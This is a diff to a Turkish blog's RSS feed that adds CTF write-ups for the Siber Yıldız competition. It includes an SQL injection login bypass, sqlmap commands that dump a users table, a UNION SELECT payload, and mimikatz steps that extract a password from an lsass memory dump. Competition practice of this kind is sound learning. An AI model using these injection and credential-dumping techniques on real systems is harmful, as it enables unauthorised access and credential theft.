@@ -5,8 +5,8 @@
         <description>Mertcan GÖKGÖZ - Özgür Yazılım, Sunucu Yönetimi ve Hizmetleri - Mertcan GÖKGÖZ</description>
         <link>https://mertcangokgoz.com</link>
         <link></link>
-        <lastBuildDate>Sat, 21 Jan 2017 20:27:43 +0300</lastBuildDate>
-        <pubDate>Sat, 21 Jan 2017 20:27:43 +0300</pubDate>
+        <lastBuildDate>Sun, 22 Jan 2017 16:26:33 +0300</lastBuildDate>
+        <pubDate>Sun, 22 Jan 2017 16:26:33 +0300</pubDate>
         <ttl>1800</ttl>
 
 
@@ -47,7 +47,85 @@
 &lt;p&gt;Kullanıcı adı: Yonetici&lt;br /&gt;
 Şifre: 1’or’1’=’1&lt;/p&gt;
 
-&lt;p&gt;Olarak sisteme giriş yaptık&lt;/p&gt;
+&lt;p&gt;Olarak sisteme giriş yaptık cevabı deli gibi sitede aradık hatta giriş yaptın bölümündeki değerleri deneyen arkadaşlarımız bile oldu bu soruyu uzun süre yapamadık siteye yapılan ddos saldırıları ve kesintiler aslında bu konuda başımızı baya ağrıttı kimi zaman soruların alanlarınada ulaşamadık herneyse&lt;/p&gt;
+
+&lt;p&gt;Burp suiteyi browser ile beraber çalışacak hale getirin( burp suite -&amp;gt; Proxy -&amp;gt; Options(burada 127.0.0.1:8080 var ve tikli ise)
+browser(iceweasel) -&amp;gt; preferences -&amp;gt; advanced options -&amp;gt; Connection -&amp;gt; Manual Proxy Connection HTTP Proxy 127.0.0.1 Port 8080 yapın kaydedin.&lt;/p&gt;
+
+&lt;p&gt;Burpta intercept off olarak ayarlayın.
+Iceweaselda http://85.111.95.37/fc00914149de9f33c30cf0164ec4db95/ açın.&lt;/p&gt;
+
+&lt;p&gt;sayfa yüklendikten sonra burpta &lt;code class=&quot;highlighter-rouge&quot;&gt;intercept ON&lt;/code&gt; yapın.&lt;/p&gt;
+
+&lt;p&gt;Kullanıcı adı: Yonetici&lt;br /&gt;
+Şifre: ‘or ‘1’=’1&lt;/p&gt;
+
+&lt;p&gt;olarak yollayın.&lt;/p&gt;
+
+&lt;p&gt;Burp RAW sekmesinde bir post data yakalamış olacaktır.&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
+POST /fc00914149de9f33c30cf0164ec4db95/ HTTP/1.1
+Host: 85.111.95.37
+User-Agent: Mozilla/5.0 (X11; Linux i686; rv:38.0) Gecko/20100101 Firefox/38.0 Iceweasel/38.3.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://85.111.95.37/fc00914149de9f33c30cf0164ec4db95/
+Cookie: PHPSESSID=h2041ov1n3ukbfqjmlc0pu7657
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 48
+
+kullaniciadi=Yonetici&amp;amp;parola=%27or%271%27%3D%271
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;ve bu datayı kopyalayın sql2.txt olarak Root Home içersine kayıt edin. yeni terminal açın sqlmap -r sql2.txt -p parola //yazın password kısımının sql injectiona açık olduğunu bulacaktır. çıkan sorulara yes deyin database in &lt;code class=&quot;highlighter-rouge&quot;&gt;mySQL&lt;/code&gt; olduğunu bulacaktır. Olaylar buradan sonra başlayacak&lt;/p&gt;
+
+&lt;p&gt;database adını bulacaksınız. 2 adet database buluyor teki information_sc bunu geçin klasik hepsinde olan diğerdir diğeri ise bizim aradığımız&lt;/p&gt;
+
+&lt;p&gt;adı: web2&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sqlmap -u &quot;http://85.111.95.37/fc00914149de9f33c30cf0164ec4db95&quot; --data=&quot;kullaniciadi=Yonetici&amp;amp;parola='or '1'='1&quot; --dbs
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;tabloları çekmek için&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sqlmap -u &quot;http://85.111.95.37/fc00914149de9f33c30cf0164ec4db95&quot; --data=&quot;kullaniciadi=Yonetici&amp;amp;parola='or '1'='1&quot; --tables -D web2
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;kullanicilar diye tek bir tablo bulucak.&lt;/p&gt;
+
+&lt;p&gt;Kolonları çekmek için&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sqlmap -u &quot;http://85.111.95.37/fc00914149de9f33c30cf0164ec4db95&quot; --data=&quot;kullaniciadi=Yonetici&amp;amp;parola='or '1'='1&quot; --columns-D web2 -T kullanicilar
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;Bunun sonucunda aşağıdaki gibi bir sonuç çıkacak&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;id int(255)
+kullaniciadi varchar(255)
+parola int(255)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;kolonlardaki verileri çekmek için&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;sqlmap -u &quot;http://85.111.95.37/fc00914149de9f33c30cf0164ec4db95&quot; --data=&quot;kullaniciadi=Yonetici&amp;amp;parola='or '1'='1&quot; --dump -D web2 -T kullanicilar
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;2 adet Kullanıcı bulucak teki &lt;code class=&quot;highlighter-rouge&quot;&gt;Yonetici&lt;/code&gt; diğerinin adı “FLAG:” &lt;strong&gt;FLAG&lt;/strong&gt; kullanıcısının parolası&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;f4aa0edc033b9dfcc676c33420996789
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;Kaynak: Alpcan ONARAN&lt;/p&gt;
 
 &lt;hr /&gt;
 
@@ -283,7 +361,24 @@ a-b OR a/b  &amp;gt; Char
 &lt;/code&gt;&lt;/pre&gt;
 &lt;/div&gt;
 
-&lt;p&gt;Ancak bu değer sistem tarafından kabul edilmiyor. Dosya içerisinde başka bir şekilde bulunuyor olma ihtimali yüksek&lt;/p&gt;
+&lt;p&gt;Ancak haliyle cevap bu değil daha sonra biz düşündük ki Hackerın oğlu adlı CTF de bulduğumuz bir değer vardı google ve github araması yaparak bayrağa ulaşmıştık bu tarz bir soru olabileceğini düşündük ve direk olarak google aramalarına başladık&lt;/p&gt;
+
+&lt;p&gt;İlk olarak&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;github&lt;/li&gt;
+  &lt;li&gt;gitlab&lt;/li&gt;
+  &lt;li&gt;bitbucket&lt;/li&gt;
+  &lt;li&gt;facebook&lt;/li&gt;
+  &lt;li&gt;twitter&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Derken twitterda bir adet hesap çıktı karşımıza ve &lt;code class=&quot;highlighter-rouge&quot;&gt;siber starımı arıyorsun ?&lt;/code&gt; yazıyordu altındada ilginç ve bol &lt;code class=&quot;highlighter-rouge&quot;&gt;aa&lt;/code&gt; içeren bir mesaj, şu şekilde&lt;/p&gt;
+
+&lt;blockquote class=&quot;twitter-tweet&quot; data-lang=&quot;tr&quot;&gt;&lt;p lang=&quot;und&quot; dir=&quot;ltr&quot;&gt;aaaａａaaａaaａaaaaａaａaaaａaａaaａａａaaaａａａａaaaａaaaaaａaａaaaaaaaaaaａａaａａaaａaaaaａaaａａａaａaａaaａaaａaaａａaａaａaaaａａａａaaａaaａaaａaaａａaaaaaaaaaaaaaaaaaaaaaaaaa&lt;/p&gt;&amp;mdash; Siber Star (@siber_star) &lt;a href=&quot;https://twitter.com/siber_star/status/794469360723230720&quot;&gt;4 Kasım 2016&lt;/a&gt;&lt;/blockquote&gt;
+&lt;script async=&quot;&quot; src=&quot;//platform.twitter.com/widgets.js&quot; charset=&quot;utf-8&quot;&gt;&lt;/script&gt;
+
+&lt;p&gt;Daha sonra google araması yapmaya devam ettik bu neyin şifrelemesiydi yada neyi işaret ediyordu diye soru steg sorusu olduğu için googlede &lt;code class=&quot;highlighter-rouge&quot;&gt;Twitter Steganography&lt;/code&gt; olarak arama yaptık karşımıza java ile yazılmış bir adet tool ve online bu işlemin yapılabileceği bir web sitesi çıktı direk olarak kopyala yapıştır yaptıktan sonra IRC kanalını işaret ediyordu haliyle bayrağı buradan elde ettik.&lt;/p&gt;
 
 &lt;hr /&gt;
 
@@ -348,7 +443,28 @@ for i in liste.split(&quot;,&quot;):
 &lt;/code&gt;&lt;/pre&gt;
 &lt;/div&gt;
 
-&lt;p&gt;devamı gelecek…&lt;/p&gt;
+&lt;p&gt;İşlemi yaptık bu işlemden sonra bize bir takım MAC adreslerine benzeyen ama cihaz hakkında bilgi sağladığını biliyorduk hemen googlede ufak bir arama yaptık ve bu konuda google CTF de bir makele bulduk aramak o kadarda uzun sürmedi daha sonra bunun usb bellek olmadığını bir fare olduğunu anladık bu bizim içinde bir ilk oldu forensic konusunda eksik olduğumuzuda haliyle anlamış olduk :)&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;awk -F: 'function comp(v){if(v&amp;gt;127)v-=256;return v}{x+=comp(strtonum(&quot;0x&quot;$2));y+=comp(strtonum(&quot;0x&quot;$3))}$1==&quot;01&quot;{print x,y}' dump.txt &amp;gt; sirali.txt
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;-1084 -79
+-1084 -79
+-1083 -80
+-1083 -86
+-1083 -89
+-1083 -97
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;ve devam eden satırlar gördük sonra makaledede belirttiği gibi &lt;code class=&quot;highlighter-rouge&quot;&gt;gnuplot&lt;/code&gt; kullanarak bir çizim elde ettik bu çizimde ise &lt;code class=&quot;highlighter-rouge&quot;&gt;fareyi_buldum&lt;/code&gt; yazıyordu. Bu değeri MD5 olarak çevirdiğimizde ise cevabı elde etmiş olduk&lt;/p&gt;
+
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;a9930510d6923f409fcdba49f8280a3f
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/div&gt;
+
+&lt;p&gt;Kullandığımız makale ise &lt;a href=&quot;https://www.rootusers.com/google-ctf-2016-forensic-for2-write-up/&quot;&gt;Google CTF 2016 Forensic&lt;/a&gt;&lt;/p&gt;
 
 &lt;hr /&gt;
 
@@ -419,12 +535,6 @@ try.html
 
 &lt;p&gt;&lt;strong&gt;Soru 11&lt;/strong&gt;&lt;/p&gt;
 
-&lt;p&gt;&lt;em&gt;Holowy Conz den beklediğimiz mesaj geldi, acaba nedir ?&lt;/em&gt;&lt;/p&gt;
-
-&lt;hr /&gt;
-
-&lt;p&gt;&lt;strong&gt;Soru 12&lt;/strong&gt;&lt;/p&gt;
-
 &lt;p&gt;&lt;em&gt;Yapabileceğine inancımız tam.&lt;/em&gt; Bu sorudada öncelikli olarak linki baya bi kurcaladık ne var ne yok diye bakma isteği duyduk sonra get isteği atmaya sql map ile denemeye başladık ilk olarak yüksek hızlı tarama işlemi yapınca site requestleri drop etmeye başladı bizde dedik bu böyle olmaz bir takım kısıtlamalar ile taramaya devam ettik şu şekilde bir URL elde ettik&lt;/p&gt;
 
 &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;index.php?id=1' UNION ALL SELECT NULL,CONCAT(0x716b626b71,0x756a64567375626642615a5042756b5551576d4345784d6e527a526545734a6c585a4a4745766175,0x71786b6271)-- mmYT--
@@ -433,13 +543,110 @@ try.html
 
 &lt;hr /&gt;
 
-&lt;p&gt;&lt;strong&gt;Soru 13&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Soru 12&lt;/strong&gt;&lt;/p&gt;
 
 &lt;p&gt;&lt;em&gt;Zararlı bir hacker’ın bilgisayarından veri elde ettik, içerisindeki hackerin şifresini bulabilir misin ?&lt;/em&gt;&lt;/p&gt;
 
+&lt;p&gt;Bu soruda bizlere bir dosya verilmişti.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;strong&gt;Dosya ismi :&lt;/strong&gt; usom-forensics&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Bu gibi sorularda ilk olarak yapmamız gereken şey dosya hakkında bilgi almak için “&lt;strong&gt;file&lt;/strong&gt;” komutunu kullanmaktır. Bizde bu soruda bu komu ile dosyayı incelediğimizde aşağıdaki gibi bir sonuç ile karşılaştık.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;strong&gt;Komut:&lt;/strong&gt; file usom-forensics&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/file.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Bu bilgiden sonra “mv” komutu ile dosyanın uzantısını değiştiriyoruz.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;strong&gt;Komut:&lt;/strong&gt; mv usom-forensics usom-forensics.7z&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Daha sonra “7za” aracı ile dosya içerisindeki veriyi çıkartıyoruz.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;strong&gt;Komut:&lt;/strong&gt; 7za e usom-forensics.7z&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/7ze.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;İçerisindeki veri tekrar file komutu ile incelendiğinde bir data olduğu bilgisini alıyoruz. Bu işlemden sonra volatility aracı ile incelemeye alıyoruz.&lt;/p&gt;
+
+&lt;p&gt;Bunun için ilk olarak image hakkında bilgi almak için aşağıdaki komutu kullanıyoruz.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;strong&gt;Komut:&lt;/strong&gt; volatility -f usom-forensics imageinfo&lt;/li&gt;
+  &lt;li&gt;“-f”: incelenecek dosya tanımlanır.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;RAM imajı analizi sorularında genelde ilk yapılması gereken şey, “&lt;strong&gt;pslist&lt;/strong&gt;” komutu ile çalışan işlemleri listelemek ve sistemde o anda ki işleyiş hakkında bilgi sahibi olmaktır.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;strong&gt;Komut:&lt;/strong&gt; volatility -f usom-forensics –profile=Win7SP0x86 pslist&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/pslist.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Bu çıktı sonucunda dikkat çeken işlemler:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;mspaint.exe&lt;/li&gt;
+  &lt;li&gt;notepad.exe&lt;/li&gt;
+  &lt;li&gt;lsass.exe&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;mspaint.exe dumpı alınıp gimp ile incelenip üzerine çalışılan resim üzerinden bilgi elde edilebilir. CTF lerde bu tarz sorular görüyoruz. Ancak böyle bir inceleme sonucunda aşağıdaki gibi bir sonuç ile karşılaştık.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/flagdegil.jpg&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Zaten bize sorulan şey bir parolaydı.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Soru: Zararlı bir hacker’ın bilgisayarından veri elde ettik, içerisindeki hackerin şifresini bulabilir misin ?&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Bu nedenle volatility içerisinde kullanılabilen hashdump parametresi de denenebilirdi. Ancak burda da tatmin edici bir sonuç yoktu.&lt;/p&gt;
+
+&lt;p&gt;“pslist” dışında en çok işinize yarayacak bir diğer parametre “&lt;strong&gt;filescan&lt;/strong&gt;” parametresidir.&lt;/p&gt;
+
+&lt;p&gt;Dosya üzerinde “&lt;strong&gt;filescan&lt;/strong&gt;” çalıştırıldığında flag adı ile bazı dosyalar olduğu gözlemlenmiştir.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;strong&gt;Komut:&lt;/strong&gt; volatility -f usom-forensics –profile=Win7SP0x86 filescan&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/filescan.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Bu veriler “&lt;strong&gt;dumpfiles&lt;/strong&gt;” parametresi ile elde edilebiliyordu.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/dumpfiles.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Elde edilen bu verilerden &lt;strong&gt;flag.txt&lt;/strong&gt; incelendiğinde lsass dump dosyasına ait bir link elde ediliyordu.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/flag.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Bu dump mimikatz ile incelendiğinde parola elde edilebiliyordu.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Adımlar:&lt;/strong&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;privilege::debug&lt;/li&gt;
+  &lt;li&gt;sekurlsa::minidump lsass&lt;/li&gt;
+  &lt;li&gt;sekurlsa::logonPasswords&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/pass.png&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Asıl Kaynak: &lt;a href=&quot;https://github.com/besimaltnok/siberyildiz/blob/master/usom_forensics/forensics.md&quot;&gt;Besim ALTINOK&lt;/a&gt;&lt;/p&gt;
+
 &lt;hr /&gt;
 
-&lt;p&gt;&lt;strong&gt;Soru 14&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;Soru 13&lt;/strong&gt;&lt;/p&gt;
 
 &lt;p&gt;&lt;em&gt;Nedir bu sence ?&lt;/em&gt; Sorusunun ne olduğunu her ne kadar anlasak da cevaba ulaşamadık altın oran sorusu olup fibonacci ile rabbit seq arasında bir ilişki bulunmakta&lt;/p&gt;
 
@@ -447,6 +654,8 @@ try.html
 
 &lt;p&gt;Yasin YAMAN&lt;br /&gt;
 Ömer İPEK&lt;br /&gt;
+Yusuf GENÇ&lt;br /&gt;
+Onur KOLAY&lt;br /&gt;
 Furkan KALKAN ve diğer tüm arkadaşlarıma teşekkürlerimi sunarım.&lt;/p&gt;
 </description>
                 <link>https://mertcangokgoz.com/siberyildiz-soru-ve-cevaplari/</link>
